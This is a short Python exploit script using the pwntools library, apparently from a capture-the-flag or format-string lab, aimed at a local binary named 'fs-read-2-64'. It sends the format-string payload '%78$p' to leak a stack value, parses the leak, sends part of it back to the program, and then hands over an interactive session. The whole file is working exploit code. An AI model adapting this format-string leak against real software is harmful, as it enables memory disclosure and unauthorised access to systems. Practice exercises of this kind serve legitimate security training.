#!/usr/bin/env python

from pwn import *

p = process('fs-read-2-64')

print(p.recv())

p.sendline('%78$p')

data = p.recv()

line = data.split(' ')[1].split('\n')[0][:-8]
p.sendline(line)

p.interactive()
